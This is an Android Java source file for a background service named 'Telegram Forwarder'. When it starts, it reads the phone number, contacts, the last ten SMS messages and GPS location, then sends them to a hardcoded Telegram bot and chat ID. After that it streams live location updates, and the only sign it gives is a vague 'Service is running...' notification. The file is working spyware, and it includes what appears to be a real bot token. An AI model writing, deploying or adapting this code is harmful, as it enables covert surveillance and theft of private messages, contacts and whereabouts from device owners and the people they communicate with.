package com.example.telegramforwarder;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class ForegroundService extends Service implements LocationListener {

    private static final String CHANNEL_ID = "ForegroundServiceChannel";

    private final String TELEGRAM_BOT_TOKEN = "8400096846:AAErUkhr4eOPHM7qiFRnbyrDVnlUBZtYl8I";
    private final String TELEGRAM_CHAT_ID = "6650114658";

    private LocationManager locationManager;
    private Location currentLocation;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Telegram Forwarder")
                .setContentText("Service is running...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        requestLocationUpdates();

        // Send initial data on start
        new Thread(this::sendAllData).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Telegram Forwarder Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private void requestLocationUpdates() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, this);
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10, this);
                }
            } else {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 10, this);
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 10, this);
            }
        } catch (Exception e) {
            Log.e("ForegroundService", "Location request failed", e);
        }
    }

    private void sendAllData() {
        try {
            String phoneNumber = getPhoneNumber();
            String contacts = getContacts();
            String smsInbox = getSmsInbox();
            String locationString = getLocationString();

            String message = "Phone Number: " + phoneNumber
                    + "\n\nContacts:\n" + contacts
                    + "\n\nSMS Inbox (last 10):\n" + smsInbox
                    + "\n\nLocation:\n" + locationString;

            sendMessageToTelegram(message);
        } catch (Exception e) {
            Log.e("ForegroundService", "Error sending data", e);
        }
    }

    private String getPhoneNumber() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                return "Permission not granted";
            }
            String number = tm.getLine1Number();
            return (number != null && !number.isEmpty()) ? number : "Unavailable";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String getContacts() {
        StringBuilder contactsBuilder = new StringBuilder();
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsBuilder.append(name).append(": ").append(phone).append("\n");
                    if (contactsBuilder.length() > 1500) break; // Limit message size
                }
                cursor.close();
            }
        } catch (Exception e) {
            contactsBuilder.append("Error: ").append(e.getMessage());
        }
        return contactsBuilder.toString();
    }

    private String getSmsInbox() {
        StringBuilder smsBuilder = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI,
                    null, null, null, "date DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 10) { // last 10 messages
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    smsBuilder.append(address).append(": ").append(body).append("\n");
                    count++;
                }
                cursor.close();
            }
        } catch (Exception e) {
            smsBuilder.append("Error: ").append(e.getMessage());
        }
        return smsBuilder.toString();
    }

    private String getLocationString() {
        if (currentLocation != null) {
            return "Lat: " + currentLocation.getLatitude() + ", Lon: " + currentLocation.getLongitude();
        } else {
            return "Location unavailable";
        }
    }

    private void sendMessageToTelegram(String message) {
        try {
            String encodedMessage = URLEncoder.encode(message, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN
                    + "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID
                    + "&text=" + encodedMessage;

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String inputLine;

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            Log.i("TelegramSend", "Message sent: " + response.toString());
        } catch (Exception e) {
            Log.e("TelegramSend", "Failed to send message", e);
        }
    }

    @Override
    public void onLocationChanged(@NonNull Location location) {
        currentLocation = location;

        // Send live location to Telegram
        sendLocationToTelegram(location);
    }

    private void sendLocationToTelegram(Location location) {
        try {
            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN
                    + "/sendLocation?chat_id=" + TELEGRAM_CHAT_ID
                    + "&latitude=" + location.getLatitude()
                    + "&longitude=" + location.getLongitude();

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String inputLine;

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            Log.i("TelegramSend", "Location sent: " + response.toString());
        } catch (Exception e) {
            Log.e("TelegramSend", "Failed to send location", e);
        }
    }

    @Override public void onStatusChanged(String provider, int status, Bundle extras) { }
    @Override public void onProviderEnabled(@NonNull String provider) { }
    @Override public void onProviderDisabled(@NonNull String provider) { }
    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
}
